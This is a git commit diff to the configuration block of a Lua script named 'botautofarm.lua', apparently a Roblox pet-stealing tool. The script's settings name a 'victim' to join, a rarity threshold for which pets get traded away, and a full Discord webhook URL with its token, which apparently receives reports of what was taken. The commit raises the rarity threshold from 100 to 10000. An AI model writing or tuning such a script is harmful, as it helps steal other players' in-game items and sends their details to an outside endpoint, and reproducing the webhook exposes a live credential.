1a79922aa00ccfa6cc665884c08740a6159c96a4
relapsedddd <callumlovesdad@gmail.com>
2025-04-19 10:57:52 -0600

    Update botautofarm.lua

--- botautofarm.lua
+++ botautofarm.lua
@@ -1,5 +1,5 @@
 _G.Username = "callumlovesdad" -- user you should join victim on
-_G.min_chance = 100 -- 10000 means it only trades pets that are 1 in 10k or rarer
+_G.min_chance = 10000 -- 10000 means it only trades pets that are 1 in 10k or rarer
 _G.pingEveryone = "Yes" -- change to "No" if you dont want pings
 _G.webhook = "https://discord.com/api/webhooks/1363013765821632582/3P8sSydrl2g-9dGj6VXi-maxNau__MEauJDEb16UzH4lQHZlNbc29qhH3AvxsuEuR-Lc" -- change to your webhook 
 
